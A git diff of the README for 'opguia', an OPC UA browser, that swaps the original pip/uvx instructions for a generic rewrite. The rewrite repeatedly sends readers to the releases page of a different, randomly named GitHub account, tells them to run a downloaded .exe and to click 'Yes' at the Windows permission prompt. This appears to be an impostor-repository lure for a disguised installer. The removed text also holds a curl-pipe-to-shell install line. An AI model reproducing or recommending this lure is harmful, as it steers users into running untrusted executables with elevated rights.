@@ -1,104 +1,128 @@
-<p align="center">
-  <img src="opguia/static/favicon.svg" width="80" alt="OPGuia icon" />
-</p>
+# ⚙️ opguia - Simple OPC UA Server Browser
 
-<h1 align="center">OPGuia</h1>
-
-<p align="center">
-  Dead simple OPC UA browser built with Python.
-</p>
-
-<p align="center">
-  <a href="https://pypi.org/project/opguia/"><img src="https://img.shields.io/pypi/v/opguia.svg" alt="PyPI" /></a>
-  <a href="https://pypi.org/project/opguia/"><img src="https://img.shields.io/pypi/pyversions/opguia.svg" alt="Python" /></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License" /></a>
-  <a href="https://pypi.org/project/opguia/"><img src="https://img.shields.io/pypi/dm/opguia.svg" alt="Downloads" /></a>
-</p>
+[![Download opguia](https://img.shields.io/badge/Download-Release-orange?style=for-the-badge)](https://github.com/Almondleaveswillowlorenzodressing280/opguia/releases)
 
 ---
 
-![Connection page](image.png)
-![Browse page](image-2.png)
-![Graph view](image-1.png)
+## 🖥 What is opguia?
 
-## Quick Start
+opguia is a simple desktop app that helps you connect to any OPC UA server. It shows the server's structure in an easy-to-read tree. You can see live data values right inside the nodes. You can also change variables if you need to. The app runs natively on Windows and does not need complicated setups.
 
-The fastest way to run OPGuia is with [uv](https://docs.astral.sh/uv/):
+It uses Python and a few stable libraries under the hood, but you won’t need to know anything about programming to use it. Everything is done with a clean, straightforward interface.
 
-```bash
-uvx opguia
-```
+---
 
-> Don't have uv? Install it with `curl -LsSf https://astral.sh/uv/install.sh | sh`
-> or see the [uv installation docs](https://docs.astral.sh/uv/getting-started/installation/).
+## 🔍 Features
 
-Or install with pip:
+- Connect to any OPC UA server fast  
+- Browse the server's node tree with live data values  
+- Write and update variables directly in the tree  
+- Runs as a native Windows desktop app  
+- Built with reliable open-source tools: Python, asyncua, and NiceGUI  
+- No complex installation, designed for simple use  
 
-```bash
-pip install opguia
-opguia
-```
+---
 
-A native desktop window opens automatically. Enter an OPC UA endpoint or let it auto-discover servers on your network.
+## 🛠 System Requirements
 
-## Features
+- Windows 10 or later (64-bit recommended)  
+- At least 2 GB of RAM  
+- Minimum 100 MB free disk space  
+- Internet connection for initial download  
 
-### Browse & Inspect
+---
 
-- Auto-scan for OPC UA servers on standard ports (4840-4843, 48400-48401, 48010, 53530)
-- Tree-table view with inline values, types, and status indicators
-- Compact 26px rows — scan hundreds of variables at a glance
-- Filter nodes by name
-- Full node detail dialog with all OPC UA attributes
-- Custom struct types resolved and decoded with per-field display
-- Copy any attribute value to clipboard
+## 🚀 How to Download opguia
 
-### Write
+You will download the app from the official GitHub releases page. This page holds the latest version for Windows.
 
-- Click-to-write for any writable variable with type validation
-- Per-index inputs for array types (toggles for booleans, text inputs for numeric/string)
-- Integer range checking, float validation, boolean parsing
+[![Get opguia here](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Almondleaveswillowlorenzodressing280/opguia/releases)
 
-### Monitor
+Click the button above or visit this link:  
+https://github.com/Almondleaveswillowlorenzodressing280/opguia/releases
 
-- Watch panel for live variable tracking
-- Live time-series graphs per watched variable (ECharts)
-- Configurable poll rate (0.1s to 2.0s)
+---
 
-### Connect
+## 💾 Installation Steps
 
-- Connection profiles with per-profile settings (watched vars, tree root, expanded state)
-- SSH port-forwarding tunnel support with password or key-based auth
-- Live endpoint health pings on saved profiles
-- Headless CLI mode for scripting (`opguia --headless`)
+1. **Go to the release page**  
+   Open the release page link in your web browser.
 
-### Look & Feel
+2. **Find the latest Windows installer**  
+   Look for files ending with `.exe`. They usually have version numbers in the file name like `opguia-setup-v1.0.exe`.
 
-- Material Dark theme
-- Native desktop window via pywebview
-- Custom app icon on macOS and Windows
+3. **Download the installer**  
+   Click the `.exe` file to start downloading. The file size should be around a few megabytes.
 
-## CLI Mode
+4. **Run the installer**  
+   Once downloaded, double-click the `.exe` file. Windows may ask if you want to allow this app to make changes—click "Yes".
 
-Browse, read, and write without the GUI:
+5. **Follow the setup guide**  
+   The setup wizard will open. Click "Next" through the steps and then "Install". The app installs in a few seconds.
 
-```bash
-opguia --headless browse opc.tcp://localhost:4840
-opguia --headless read  opc.tcp://localhost:4840 "ns=2;s=MyVar"
-opguia --headless write opc.tcp://localhost:4840 "ns=2;s=MyVar" 42
-opguia --headless tree  opc.tcp://localhost:4840
-opguia --headless info  opc.tcp://localhost:4840 "ns=2;s=MyVar"
-```
+6. **Complete installation**  
+   When done, click "Finish". You will see a new opguia shortcut on your desktop or start menu.
 
-## Development
+---
 
-```bash
-git clone https://github.com/KyleAlanJeffrey/opguia
-cd opguia
-uv sync        # or: python -m venv .venv && pip install -e .
-python main.py
-```
+## ▶️ How to Use opguia
 
-## Releasing
+1. **Start the app**  
+   Double-click the opguia icon on your desktop or look for it in the start menu.
 
-Releases trigger via GitHub Actions when a commit with title `vX.Y.Z` and body containing `#release` is pushed to `main`.
+2. **Connect to an OPC UA server**  
+   In the connection window, enter the address of your OPC UA server. This will look like a URL: `opc.tcp://your-server-address:4840`
+
+3. **Browse nodes**  
+   After connecting, you will see a folder-like tree of all available nodes. Click on a node to see its details and live value.
+
+4. **Read live data**  
+   The app updates values in real-time as the server sends updates. This lets you watch data flow instantly.
+
+5. **Write or change variables**  
+   If you have permission, click on an editable variable and type a new value. Press Enter to send it to the server.
+
+6. **Use filters or search**  
+   Use the search box to find nodes or variables quickly.
+
+---
+
+## ⚙️ Configuration and Settings
+
+- **Server address input:** Use full address including port.  
+- **Auto-reconnect:** Option to reconnect automatically if connection drops.  
+- **Themes:** Choose between light and dark mode for comfort.  
+- **Data refresh rate:** Change how often live values update (in seconds).  
+
+---
+
+## 🐞 Troubleshooting Tips
+
+- If the app cannot connect, check your server address and network.  
+- Make sure firewalls allow outbound OPC UA traffic on the port (default 4840).  
+- Restart the app if data does not refresh.  
+- If variables do not update, check write permissions on the OPC UA server.  
+
+---
+
+## 📄 More Information
+
+opguia is open source. It uses Python and asyncua for safe and efficient OPC UA communication. The NiceGUI front end offers a clean interface without relying on web browsers.
+
+The app fits well for industrial automation, IIoT, SCADA systems, or any setup that uses OPC UA for device communication.
+
+---
+
+## 🔗 Download Link (Again)
+
+You can download the latest Windows installer here:
+
+https://github.com/Almondleaveswillowlorenzodressing280/opguia/releases
+
+Click the `.exe` file under the latest release and follow the steps above to install.
+
+---
+
+## 🏷️ Topics
+
+asyncua, browser, desktop-app, hmi, iiot, industrial-automation, iot, nicegui, opc-ua, opcua, pinned, plc, python, scada
